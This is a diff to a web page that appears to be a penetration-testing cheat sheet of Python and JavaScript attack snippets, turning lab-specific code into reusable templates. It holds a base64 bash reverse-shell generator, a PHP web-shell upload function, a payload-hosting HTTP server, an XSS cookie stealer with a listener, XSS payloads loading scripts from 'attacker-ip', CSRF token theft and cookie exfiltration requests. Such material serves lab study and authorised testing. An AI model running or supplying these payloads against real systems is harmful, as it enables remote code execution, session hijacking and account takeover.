@@ -19,7 +19,7 @@ permalink: /python-code-snippets/
     --panel: #151515;
     --muted: #a1a1a1;
     --text: #f08080;
-    --accent: #c71585;
+    --accent: #ff7f50;
     --accent-2: #ffffff;
     --code-bg: #050505;
     --border: rgba(255,255,255,0.2);
@@ -250,6 +250,7 @@ import random
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from http.server import BaseHTTPRequestHandler
 from http.server import HTTPServer
+import argparse
 
 GREEN = '\033[92m'   # Bright Green
 RED = '\033[91m'     # Bright Red
@@ -260,122 +261,83 @@ RESET = '\033[0m'    # Reset to default color
 success = f"{GREEN}[+]{RESET}"
 failure = f"{RED}[-]{RESET}"
 
-proxies = {"http":"http://127.0.0.1:8080"}
+proxies = {"http":"http://127.0.0.1:8080"}  # Optional, comment out if not needed
 
 def generate_b64revshell(listener_ip, listener_port):
-
     payload = f"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
     payload_bytes = payload.encode('ascii')
     b64payload = base64.b64encode(payload_bytes)
     base64_payload = b64payload.decode('ascii')
     return base64_payload
 
-def register():
+def register(target_url, register_data):
+    # Register logic - adjust based on application
+    r = requests.post(target_url + '/register', data=register_data, proxies=proxies)
+    # Parse response for username/password or success
+    return 'username', 'password'  # Return registered credentials
 
-    ## Register logic
-
-def login():
-
-    ## Login Logic
+def login(target_url, username, password):
+    # Login logic - adjust based on application
+    login_data = {'username': username, 'password': password}
+    r = requests.post(target_url + '/login', data=login_data, proxies=proxies)
+    # Extract cookies or session from response
+    return r.cookies
 
 if __name__ == "__main__":
-
-    # Parsers
-
-    parser = argparse.ArgumentParser(description="Full chain to RCE in Answers Application")
-    parser.add_argument('--target-ip', type=str, required=True, help="Specify the target IP Address.")
+    parser = argparse.ArgumentParser(description="General exploit template")
+    parser.add_argument('--target-url', type=str, required=True, help="Specify the target base URL.")
     parser.add_argument('--listener-ip', type=str, required=True, help="Specify the listener IP Address.")
-    parser.add_argument('--listener-port', type=str, required=True, help="Specify the listener IP Address.")   
+    parser.add_argument('--listener-port', type=str, required=True, help="Specify the listener port.")   
     args = parser.parse_args()
 
-    target_ip = args.target_ip
+    target_url = args.target_url
     listener_ip = args.listener_ip
     listener_port = args.listener_port
 
-    # Main Logic
-
-    username, password = register()
-    usercookies = login(username, password) </code></pre>
+    # Example register data - adjust as needed
+    register_data = {'username': 'example', 'password': 'example'}
+    username, password = register(target_url, register_data)
+    usercookies = login(target_url, username, password) </code></pre>
         </div>
         <hr />
       </div>
       <div class="content-section group-python" id="section-File-Upload">
         <h3 id="File-Upload">File Upload With Additional Parameters</h3>
         <div class="panel">
-          <pre><code class="language-python">def uploadFile(phpsessid):
+          <pre><code class="language-python">import requests
+import random
+import string
+import io
 
-    url = "http://10.100.102.73:80/item/updateItem.php"
-
-    payload_content = b"<?php system($_REQUEST['cmd']); ?>"
+def upload_file(url, cookies, payload_content, data, filename_extension='.phar', mime_type='application/octet-stream'):
     pwny = io.BytesIO(payload_content)
 
-    data = {
-        "id": "1",
-        "id_user": "1",
-        "name": "Raspery Pi 4",
-        "description": ("Latest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 "
-                        "BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B"),
-        "price": "92"
-    }
-
-    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.phar'
+    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + filename_extension
     files = {
-        "image": (filename, pwny, "application/octet-stream")
-    }
-    
-    cookies = {
-
-        "PHPSESSID": phpsessid
+        "image": (filename, pwny, mime_type)
     }
 
     r = requests.post(url, data=data, files=files, cookies=cookies, proxies=proxies, allow_redirects=False)
-    loginheader = r.headers.get("Location", "")
-    match = re.search(r'index\.php$', loginheader)
-    if match:
+    # Adjust success check based on application response
+    if 'success' in r.text.lower():  # Example check
         print(f"[+] Filename {filename} uploaded successfully!")
+        return filename
     else:
         print("[-] File is not uploaded.")
-    return filename</code></pre>
+        return None</code></pre>
         </div>
         <hr />
       </div>
       <div class="content-section group-python" id="section-HTTP-File-Server">
-        <h3 id="HTTP-File-Server">HTTP File Server 1</h3>
-        <div class="panel">
-          <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
-from http.server import HTTPServer
-
-LHOST      = "10.0.0.1"
-WEB_PORT   = 8000
-JS_PAYLOAD = "&lt;script&gt;alert(1)&lt;/script&gt;"
-
-def start_web_server():
-    class MyHandler(BaseHTTPRequestHandler):
-        # Uncomment this method to suppress HTTP logs
-        # def log_message(self, format, *args):
-        #     return
-
-        def do_GET(self):
-            if self.path.endswith('/payload.js'):
-                self.send_response(200)
-                self.send_header("Content-Type", "application/javascript")
-                self.send_header("Content-Length", str(len(JS_PAYLOAD)))
-                self.end_headers()
-                self.wfile.write(JS_PAYLOAD.encode())
-            
-    httpd = HTTPServer((LHOST, WEB_PORT), MyHandler)
-    threading.Thread(target=httpd.serve_forever).start()
-
-start_web_server()</code></pre>
-        </div>
-
-        <h4>HTTP File Server 2</h4>
+        <h3 id="HTTP-File-Server">HTTP File Server Template</h3>
         <div class="panel">
           <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
 import os
+import socket
+import mimetypes
 
-def start_web_server(host="192.168.45.249", port=80, directory="."):
+def start_web_server(host='0.0.0.0', port=8000, directory='.', js_payload=None):
     os.chdir(directory)
     
     class MyHandler(BaseHTTPRequestHandler):
@@ -384,13 +346,19 @@ def start_web_server(host="192.168.45.249", port=80, directory="."):
                 file_path = os.path.join(directory, self.path.lstrip("/"))
                 if os.path.exists(file_path) and os.path.isfile(file_path):
                     self.send_response(200)
-                    if file_path.endswith(".dtd"):
-                        self.send_header("Content-type", "application/xml-dtd")
-                    else:
-                        self.send_header("Content-type", "text/plain")
+                    mime_type, _ = mimetypes.guess_type(file_path)
+                    if mime_type is None:
+                        mime_type = 'application/octet-stream'
+                    self.send_header("Content-type", mime_type)
                     self.end_headers()
                     with open(file_path, "rb") as f:
                         self.wfile.write(f.read())
+                elif self.path.endswith('/payload.js') and js_payload:
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/javascript")
+                    self.send_header("Content-Length", str(len(js_payload)))
+                    self.end_headers()
+                    self.wfile.write(js_payload.encode())
                 else:
                     self.send_response(404)
                     self.send_header("Content-type", "text/plain")
@@ -403,103 +371,24 @@ def start_web_server(host="192.168.45.249", port=80, directory="."):
                 self.wfile.write(f"Server error: {str(e)}".encode())
 
     httpd = HTTPServer((host, port), MyHandler)
-    print(f"{success} Serving at {host}:{port}")
+    print(f"Serving at {host}:{port}")
     threading.Thread(target=httpd.serve_forever, daemon=True).start()
     return httpd</code></pre>
         </div>
-
-        <h4>HTTP File Server 3</h4>
-        <div class="panel">
-          <pre><code class="language-python">import threading
-import mimetypes
-
-HOST = '0.0.0.0'
-PORT = 8000
-SERVE_DIR = '.'
-
-def handle_client(conn, addr):
-    print(f"{success} Connection from {addr}")
-    try:
-        # Receive request data
-        request = conn.recv(1024).decode('utf-8')
-        # print(f"Received request from {addr}: {request[:100]}...")  # Log first 100 chars        
-        # Simple parsing: Extract the path from "GET /path HTTP/1.1"
-        lines = request.split('\n')
-        if lines and 'GET /' in lines[0]:
-            path = lines[0].split(' ')[1]  # e.g., "/filename.txt"
-            if path == '/':
-                path = '/index.html'  # Optional: Default to index.html if root, but you can remove this
-            full_path = os.path.join(SERVE_DIR, path.lstrip('/'))
-            
-            if os.path.exists(full_path) and os.path.isfile(full_path):
-                # Read and send the file
-                with open(full_path, 'rb') as f:
-                    file_data = f.read()
-                
-                # Guess MIME type
-                mime_type, _ = mimetypes.guess_type(full_path)
-                if mime_type is None:
-                    mime_type = 'application/octet-stream'
-                
-                # Basic HTTP response
-                response = (
-                    b'HTTP/1.1 200 OK\r\n'
-                    b'Content-Type: ' + mime_type.encode('utf-8') + b'\r\n'
-                    b'Content-Length: ' + str(len(file_data)).encode('utf-8') + b'\r\n'
-                    b'\r\n'
-                )
-                conn.sendall(response + file_data)
-                print(f"Served {full_path} ({len(file_data)} bytes) to {addr}")
-            else:
-                # 404 response
-                response = b'HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n\r\nFile not found.'
-                conn.sendall(response)
-                print(f"File {full_path} not found for {addr}")
-        else:
-            # 400 for invalid request
-            response = b'HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\n\r\nInvalid request.'
-            conn.sendall(response)
-    except Exception as e:
-        print(f"Error handling {addr}: {e}")
-    finally:
-        conn.close()
-
-def server():
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reuse of address
-        s.bind((HOST, PORT))
-        s.listen(5)  # Backlog of 5 for queued connections
-        print(f"{success}Background file server listening on {HOST}:{PORT} ... (serving from {SERVE_DIR})")
-        while True:
-            conn, addr = s.accept()
-            # Handle each client in a separate thread for concurrency
-            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
-            client_thread.start()
-
-# Start the server in a background thread (daemon=True so it exits when main does)
-server_thread = threading.Thread(target=server, daemon=True)
-server_thread.start()
-
-# Main program continues here (non-blocking)
-print(f"{success} File server started in background. Main program running...")</code></pre>
-        </div>
       </div>
       <div class="content-section group-python" id="section-Python-XSS-Cookies-Stealer">
-        <h3 id="Python-XSS-Cookies-Stealer">XSS Cookies Stealer</h3>
+        <h3 id="Python-XSS-Cookies-Stealer">XSS Cookies Stealer Template</h3>
         <div class="panel">
-          <pre><code class="language-python">def send_xss_payload():
+          <pre><code class="language-python">import requests
+import socket
+import base64
+import re
 
-    payload = "&lt;script&gt;document.location='http://10.100.102.67:9001/?c='+document.cookie&lt;/script&gt;"
-    data = {
-        'title': 'test',
-        'author': 'blabla',
-        'text': payload,
-        'submit': 'Submit'
-    }
-
-    proxies = {"http": "http://127.0.0.1:8080"}  # Use Burp or comment this out
+def send_xss_payload(target_url, payload_data, xss_payload):
+    data = payload_data.copy()
+    data['text'] = xss_payload  # Adjust key based on form
     try:
-        r = requests.post(TARGET_URL, data=data, proxies=proxies)
+        r = requests.post(target_url, data=data, proxies=proxies)
         if r.status_code == 200:
             print("XSS payload sent successfully.")
         else:
@@ -507,13 +396,12 @@ print(f"{success} File server started in background. Main program running...")</
     except Exception as e:
         print(f"Error sending payload: {e}")
 
-def listen_for_cookies():
-
+def listen_for_cookies(host, port, cookie_name='PHPSESSID'):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((HOST, PORT))
+        s.bind((host, port))
         s.listen(1)
-        print(f"Listening on {HOST}:{PORT} ...")
-        print("Waiting for admin to trigger XSS...")
+        print(f"Listening on {host}:{port} ...")
+        print("Waiting for trigger...")
 
         conn, addr = s.accept()
         with conn:
@@ -526,17 +414,21 @@ def listen_for_cookies():
 
             decoded_data = data.decode('utf-8', errors='ignore')
 
-            # Extract cookie
-            match = re.search(r'PHPSESSID=([^;& ]+)', decoded_data)
+            # Extract cookie - adjust regex as needed
+            match = re.search(rf'{cookie_name}=([^;& ]+)', decoded_data)
             if match:
                 cookie = match.group(1)
-                print(f"PHPSESSID captured: " + cookie)
+                print(f"{cookie_name} captured: " + cookie)
                 return cookie
             else:
-                print("PHPSESSID not found in received data.")
+                print(f"{cookie_name} not found in received data.")
 
-send_xss_payload()
-listen_for_cookies()</code></pre>
+# Example usage
+# target_url = 'http://example.com/post'
+# payload_data = {'title': 'test', 'author': 'blabla', 'submit': 'Submit'}
+# xss_payload = "&lt;script&gt;document.location='http://listener-ip:port/?c='+document.cookie&lt;/script&gt;"
+# send_xss_payload(target_url, payload_data, xss_payload)
+# listen_for_cookies('0.0.0.0', 9001)</code></pre>
         </div>
         <hr />
       </div>
@@ -549,11 +441,11 @@ listen_for_cookies()</code></pre>
         <h3 id="Payload-1">Load External JavaScript</h3>
         <div class="panel">
           <ul>
-            <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
+            <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://attacker-ip/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
             <li><code>&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></li>
-            <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-            <li><code>&lt;iframe/srcdoc="&lt;script/src=//192.168.45.163/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
-            <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
+            <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//attacker-ip/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;iframe/srcdoc="&lt;script/src=//attacker-ip/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
+            <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://attacker-ip/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
           </ul>
         </div>
       </div>
@@ -573,13 +465,13 @@ listen_for_cookies()</code></pre>
         <div class="panel">
           <pre><code class="language-javascript">var req = new XMLHttpRequest();
 req.onload = handleResponse;
-req.open('get','/my-account',true);
+req.open('get','/account-endpoint',true);  // Adjust endpoint
 req.send();
 function handleResponse() {
-    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  // Adjust regex
     var changeReq = new XMLHttpRequest();
-    changeReq.open('post', '/my-account/change-email', true);
-    changeReq.send('csrf='+token+'&email=test@test.com')
+    changeReq.open('post', '/change-endpoint', true);  // Adjust endpoint
+    changeReq.send('csrf='+token+'&param=value')  // Adjust params
 };</code></pre>
         </div>
       </div>
@@ -595,11 +487,11 @@ function handleResponse() {
     }
     return null;
 }
-const cookieName = 'token';
+const cookieName = 'token';  // Adjust cookie name
 const cookieValue = getCookieValue(cookieName);
 
 var req2 = new XMLHttpRequest();
-req2.open('GET', 'http://192.168.45.163/' + (cookieValue || ''), false);
+req2.open('GET', 'http://attacker-ip/' + (cookieValue || ''), false);
 req2.send();</code></pre>
         </div>
       </div>
@@ -741,17 +633,12 @@ document.addEventListener('DOMContentLoaded', function() {
       const targetElement = document.querySelector(targetId);
       if (targetElement) {
         if (this.classList.contains('main-group')) {
-          const subs = this.dataset.subs.split(',');
+          const groupClass = targetElement.id.replace(/-/g, '-').split('-title')[0].toLowerCase();  // Adjust as needed
           document.querySelectorAll('.content-section').forEach(sec => sec.style.display = 'none');
-          subs.forEach(sub => {
-            const sec = document.querySelector(`#section-${sub}`);
-            if (sec) sec.style.display = 'block';
-          });
-          const titleSec = document.querySelector(`#section-${targetId.slice(1)}-title`);
-          if (titleSec) titleSec.style.display = 'block';
+          document.querySelectorAll(`.group-${groupClass}`).forEach(sec => sec.style.display = 'block');
           if (targetElement) targetElement.scrollIntoView({ behavior: 'smooth' });
         } else {
-          const section = targetElement.closest('.content-section');
+          const section = document.querySelector(`#section-${targetId.slice(1)}`);
           if (section) {
             document.querySelectorAll('.content-section').forEach(sec => sec.style.display = 'none');
             section.style.display = 'block';
